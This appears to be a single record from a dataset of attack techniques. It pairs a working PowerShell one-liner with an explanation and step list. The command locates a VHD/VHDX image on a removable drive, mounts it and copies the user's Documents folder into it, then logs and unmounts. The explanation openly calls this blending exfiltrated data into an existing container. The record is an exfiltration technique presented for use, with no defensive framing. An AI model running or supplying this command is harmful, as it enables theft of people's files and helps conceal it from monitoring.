command: $dl=(Get-Volume -DriveType Removable | Select -First 1 -Expand DriveLetter); $img=(Get-ChildItem "$dl`:\" -Filter *.vhd* -Recurse -ErrorAction SilentlyContinue | Select -First 1 -Expand FullName); if($img){ Mount-DiskImage -ImagePath $img -NoDriveLetter:$false; $v=(Get-DiskImage -ImagePath $img | Get-Disk | Get-Partition | Get-Volume | Select -First 1 -Expand DriveLetter); $target="$v`:\$env:USERNAME"; New-Item -ItemType Directory -Force -Path $target | Out-Null; Copy-Item "$env:USERPROFILE\Documents\*" -Destination $target -Recurse -Force -ErrorAction SilentlyContinue; Write-Output "Copied into mounted image $img at $(Get-Date)" | Out-File "$dl`:\mount_op.log" -Append; Dismount-DiskImage -ImagePath $img }
explanation: Mounts a disk image located on a removable drive and writes local documents into it, blending exfil data into an existing VHD/VHDX container.
rationale_steps: Find a VHD/VHDX file on the removable media
Mount the disk image to obtain a new volume letter
Copy local files into the mounted image
Log the action using Write-Output and unmount the image
